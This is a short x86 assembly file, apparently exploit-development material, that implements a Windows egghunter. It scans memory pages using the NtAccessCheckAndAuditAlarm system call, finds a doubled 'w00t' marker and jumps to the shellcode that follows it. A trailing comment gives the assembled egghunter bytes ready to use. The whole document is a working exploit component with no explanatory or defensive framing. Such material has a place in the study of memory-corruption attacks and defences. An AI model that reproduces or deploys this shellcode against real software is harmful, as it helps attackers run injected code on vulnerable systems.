global _start

_start:
    or dx, 0xfff            ; get last address in page

    .find:
        inc edx             ; increase memory counter
        push edx            ; push value to stack
        push 0x2            ; push NtAccessCheckAndAuditAlarm
        pop eax             ; $eax = NtAccessCheckAndAuditAlarm

        int 0x2e            ; system call
        cmp al, 0x5         ; check ACCESS_VIOLATION (0xc0000005)

        pop edx             ; restore edx
        jz _start           ; if zf == 1 -> next page

        mov eax, 0x74303077 ; $eax = "w00t"
        mov edi, edx        ; $edi = address

        scasd               ; cmp eax, [edi]
        jnz .find           ; if zf == 0 -> loop

        scasd               ; cmp eax, [edi]
        jnz .find           ; if zf == 0 -> loop

        jmp edi             ; if zf == 1 -> exec

; egg = b"w00t" * 2
; egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
